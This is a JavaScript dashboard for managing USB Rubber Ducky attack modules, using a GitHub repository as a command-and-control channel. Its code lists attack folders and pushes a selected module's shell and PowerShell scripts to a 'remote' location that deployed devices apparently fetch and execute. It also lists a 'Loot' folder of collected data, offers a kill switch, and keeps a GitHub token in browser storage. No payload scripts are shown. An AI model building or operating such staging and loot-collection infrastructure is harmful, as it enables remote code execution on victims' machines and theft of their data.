const API_BASE = 'https://api.github.com';

// DOM Elements
const elements = {
    settings: document.getElementById('settings'),
    dashboard: document.getElementById('dashboard'),
    repoName: document.getElementById('repoName'),
    token: document.getElementById('githubToken'),
    connectBtn: document.getElementById('connectBtn'),
    statusIndicator: document.getElementById('connectionStatus'),
    activePayloadDisplay: document.getElementById('activePayloadsList'),
    fileList: document.getElementById('fileList'),
    refreshBtn: document.getElementById('refreshFiles'),
    killSwitch: document.getElementById('killSwitch'),
    lootList: document.getElementById('lootList'),
    refreshLootBtn: document.getElementById('refreshLoot'),
    editorModal: document.getElementById('editorModal'),
    editorContent: document.getElementById('editorContent'),
    editorTitle: document.getElementById('editorTitle')
};

// State
let state = {
    token: localStorage.getItem('ducky_token') || '',
    repo: localStorage.getItem('ducky_repo') || '',
    activePayload: 'UNKNOWN'
};

// Editor State
let editorState = {
    attackName: null,
    fileType: 'sh'
};


// Initialization
function init() {
    if (state.token && state.repo) {
        elements.repoName.value = state.repo;
        elements.token.value = state.token;
        testConnection(state.repo, state.token).then(result => {
            if (result.success) showDashboard();
        });
    }
    setupEventListeners();
}

function setupEventListeners() {
    elements.connectBtn.addEventListener('click', async () => {
        const repo = elements.repoName.value.trim();
        const token = elements.token.value.trim();
        const btn = elements.connectBtn;

        if (!repo || !token) {
            alert('Please enter both Repo Name and Token');
            return;
        }

        btn.innerText = 'CONNECTING...';
        btn.disabled = true;

        try {
            const result = await testConnection(repo, token);
            if (result.success) {
                saveCredentials(repo, token);
                showDashboard();
            } else {
                alert(`CONNECTION FAILED:\n${result.error}\n\nCheck your Token permissions (Repo: Read/Write) and Repo Name.`);
            }
        } catch (e) {
            alert('System Error: ' + e.message);
        } finally {
            btn.innerText = 'INITIALIZE_CONNECTION';
            btn.disabled = false;
        }
    });

    elements.refreshBtn.addEventListener('click', () => {
        loadFiles();
        checkActivePayload();
    });

    // New Listeners
    elements.killSwitch.addEventListener('click', triggerKillSwitch);
    elements.refreshLootBtn.addEventListener('click', loadLoot);
}

// GitHub API Functions
async function testConnection(repo, token) {
    try {
        const response = await fetch(`${API_BASE}/repos/${repo}`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (response.ok) {
            return { success: true };
        } else {
            return { success: false, error: `${response.status} ${response.statusText}` };
        }
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function loadFiles() {
    elements.fileList.innerHTML = '<div class="loading">LOADING_MODULES...</div>';

    try {
        // Fetch contents of Rubber_Ducky/Attacks
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        const files = await response.json();
        renderFiles(files);
    } catch (e) {
        elements.fileList.innerHTML = `<div class="terminal-output" style="color: var(--accent)">ERROR: ${e.message}</div>`;
    }
}

async function checkActivePayload() {
    elements.activePayloadDisplay.innerHTML = '<span class="loading">SCANNING_ACTIVATION_SCRIPTS...</span>';

    try {
        // Read remote/activate.sh to see what's active
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/remote/activate.sh`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (response.ok) {
            const data = await response.json();
            const content = atob(data.content);

            // Look for the attack name in the metadata comment
            // Example: # ATTACK: Rickroll
            const match = content.match(/# ATTACK: (.+)/);
            if (match && match[1]) {
                state.activePayload = match[1].trim();
                elements.activePayloadDisplay.innerHTML = `<span class="status-indicator connected">${state.activePayload}</span>`;
                return;
            }
        }

        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator">NO_ACTIVE_PAYLOAD_DETECTED</span>';
    } catch (e) {
        console.error(e);
        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator error">SCAN_ERROR</span>';
    }
}

async function updateFile(path, content, message, isBase64 = false) {
    try {
        let sha = '';
        try {
            const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
                headers: {
                    'Authorization': `Bearer ${state.token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });
            if (current.ok) {
                const data = await current.json();
                sha = data.sha;
            }
        } catch (e) { }

        const body = {
            message: message,
            content: isBase64 ? content : btoa(content),
            branch: 'main'
        };

        if (sha) body.sha = sha;

        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        return true;
    } catch (e) {
        throw e;
    }
}

// UI Functions
function showDashboard() {
    elements.settings.classList.add('hidden');
    elements.dashboard.classList.remove('hidden');
    elements.statusIndicator.innerText = 'CONNECTED';
    elements.statusIndicator.classList.add('connected');
    loadFiles();
    checkActivePayload();
    loadLoot();
}

function renderFiles(files) {
    elements.fileList.innerHTML = '';

    if (!Array.isArray(files)) return;

    // Filter for directories (Attacks)
    const attacks = files.filter(f => f.type === 'dir');

    attacks.forEach(attack => {
        const card = document.createElement('div');
        card.className = 'file-card';

        const isActive = attack.name === state.activePayload;
        if (isActive) card.classList.add('active');

        card.innerHTML = `
            <div class="file-info">
                <div class="file-name">${attack.name}</div>
                <div class="file-size">MODULE</div>
            </div>
            <div class="file-actions">
                <button class="cyber-btn small" onclick="openEditor('${attack.name}')" style="margin-right: 5px; border-color: var(--text-secondary); color: var(--text-secondary);">EDIT</button>
                ${!isActive ? `<button class="cyber-btn small" onclick="activatePayload('${attack.name}')">ACTIVATE</button>` : '<span class="status-indicator connected">ACTIVE</span>'}
            </div>
        `;
        elements.fileList.appendChild(card);
    });
}

// Lootbox Logic
async function loadLoot() {
    elements.lootList.innerHTML = '<div class="loading">SCANNING_LOOT...</div>';
    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Loot`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });
        if (response.ok) {
            const files = await response.json();
            renderLoot(files);
        } else {
            elements.lootList.innerHTML = '<div class="terminal-output">NO_LOOT_FOUND</div>';
        }
    } catch (e) {
        elements.lootList.innerHTML = `<div class="terminal-output error">ERROR: ${e.message}</div>`;
    }
}

function renderLoot(files) {
    elements.lootList.innerHTML = '';
    if (!Array.isArray(files) || files.length === 0) {
        elements.lootList.innerHTML = '<div class="terminal-output">NO_LOOT_FOUND</div>';
        return;
    }

    files.forEach(file => {
        const card = document.createElement('div');
        card.className = 'file-card';
        card.innerHTML = `
                <div class="file-info">
                    <div class="file-name">${file.name}</div>
                    <div class="file-size">${(file.size / 1024).toFixed(2)} KB</div>
                </div>
                <div class="file-actions">
                    <a href="${file.html_url}" target="_blank" class="cyber-btn small">VIEW</a>
                </div>
            `;
        elements.lootList.appendChild(card);
    });
}

// Editor Logic
window.openEditor = async function (attackName) {
    editorState.attackName = attackName;
    editorState.fileType = 'sh';
    elements.editorTitle.innerText = `EDIT_PAYLOAD: ${attackName}`;
    elements.editorModal.classList.remove('hidden');
    await loadEditorContent();
};

window.closeEditor = function () {
    elements.editorModal.classList.add('hidden');
};

window.switchTab = async function (type) {
    editorState.fileType = type;
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    event.target.classList.add('active');
    await loadEditorContent();
};

async function loadEditorContent() {
    elements.editorContent.value = 'LOADING...';
    try {
        const filename = editorState.fileType === 'sh' ? 'activate.sh' : 'activate.ps1';
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${editorState.attackName}/${filename}`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });
        if (response.ok) {
            const data = await response.json();
            elements.editorContent.value = atob(data.content);
        } else {
            elements.editorContent.value = '# FILE NOT FOUND';
        }
    } catch (e) {
        elements.editorContent.value = 'ERROR LOADING FILE';
    }
}

window.saveEditorContent = async function () {
    const content = elements.editorContent.value;
    const filename = editorState.fileType === 'sh' ? 'activate.sh' : 'activate.ps1';
    const path = `Rubber_Ducky/Attacks/${editorState.attackName}/${filename}`;

    try {
        await updateFile(path, content, `Update ${filename} for ${editorState.attackName}`);
        alert('SAVED_SUCCESSFULLY');
    } catch (e) {
        alert('SAVE_FAILED: ' + e.message);
    }
};

function saveCredentials(repo, token) {
    state.repo = repo;
    state.token = token;
    localStorage.setItem('ducky_repo', repo);
    localStorage.setItem('ducky_token', token);
}

// Logic Functions
async function deleteFile(path, message) {
    try {
        // Get SHA first
        let sha = '';
        const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (current.ok) {
            const data = await current.json();
            sha = data.sha;
        } else {
            return false; // File doesn't exist
        }

        const body = {
            message: message,
            sha: sha,
            branch: 'main'
        };

        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            method: 'DELETE',
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        return true;
    } catch (e) {
        throw e;
    }
}

async function triggerKillSwitch() {
    if (!confirm('WARNING: KILL SWITCH ENGAGED.\nThis will DELETE remote/activate.sh and remote/activate.ps1.\nAre you sure?')) return;

    const btn = elements.killSwitch;
    const originalText = btn.innerText;
    btn.innerText = 'KILLING...';
    btn.disabled = true;

    try {
        await deleteFile('Rubber_Ducky/remote/activate.sh', 'KILL SWITCH: Deleted activate.sh');
        await deleteFile('Rubber_Ducky/remote/activate.ps1', 'KILL SWITCH: Deleted activate.ps1');

        alert('KILL SWITCH EXECUTED SUCCESSFULLY');
        state.activePayload = 'KILLED';
        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator error">KILLED</span>';
        loadFiles(); // Refresh file list to show inactive state
    } catch (e) {
        alert('KILL SWITCH FAILED: ' + e.message);
    } finally {
        btn.innerText = originalText;
        btn.disabled = false;
    }
}

window.activatePayload = async function (attackName) {
    if (!confirm(`ACTIVATE MODULE: ${attackName}?\nThis will overwrite remote/activate.sh and remote/activate.ps1.`)) return;

    try {
        // 1. Fetch source scripts
        const [shRes, ps1Res] = await Promise.all([
            fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${attackName}/activate.sh`, { headers: { 'Authorization': `Bearer ${state.token}` } }),
            fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${attackName}/activate.ps1`, { headers: { 'Authorization': `Bearer ${state.token}` } })
        ]);

        if (!shRes.ok || !ps1Res.ok) throw new Error("Could not find activate.sh or activate.ps1 in attack folder");

        const shData = await shRes.json();
        const ps1Data = await ps1Res.json();

        // Decode content to inject comment
        const shContent = atob(shData.content);
        const ps1Content = atob(ps1Data.content);

        // Inject Metadata
        const newShContent = `# ATTACK: ${attackName}\n${shContent}`;
        const newPs1Content = `# ATTACK: ${attackName}\n${ps1Content}`;

        // 2. Update target scripts
        await updateFile('Rubber_Ducky/remote/activate.sh', newShContent, `Activate ${attackName} (sh)`);
        await updateFile('Rubber_Ducky/remote/activate.ps1', newPs1Content, `Activate ${attackName} (ps1)`);

        alert(`SUCCESS: Activated ${attackName}`);
        checkActivePayload();
        loadFiles();
    } catch (e) {
        alert(`FAILED: ${e.message}`);
    }
};

// Start
init();
